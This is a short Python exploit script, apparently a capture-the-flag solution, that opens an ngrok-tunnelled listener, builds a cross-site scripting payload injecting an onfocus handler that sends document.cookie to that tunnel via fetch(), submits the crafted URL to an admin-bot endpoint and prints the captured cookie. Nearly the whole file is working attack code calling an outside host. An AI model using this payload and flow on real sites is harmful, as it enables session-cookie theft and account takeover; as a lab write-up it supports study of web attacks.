import requests
import sys
import ngrok
from pwn import *

if len(sys.argv) >= 3:
  remoteURL = sys.argv[2]
elif len(sys.argv) == 2:
  remoteURL = "http://localhost:12003"
else:
  print("Usage: python solve.py <ngrok token> <remote (default: http://localhost:12003)>")
  sys.exit(1)

ngrok.set_auth_token(sys.argv[1])
l = listen(19195)
forwarder = ngrok.connect(19195, "tcp")
print("trying against "+remoteURL)

payload = """```asd"onfocus="fetch(`http://"""+forwarder.url()[6:]+"""/${document.cookie}`)"tabindex="1"id="x"id="asd"""
import base64
payload = base64.b64encode(payload.encode()).decode()
payload.replace("+","%2b")
requests.post(remoteURL+"/submit",data={"url":"http://doc-web:3000/?input="+payload+"#x"}).text

print(l.recvline()[10:-11].decode().replace("%7B","{").replace("%7D","}"))
# test commit for Luca's shit, again, again, again
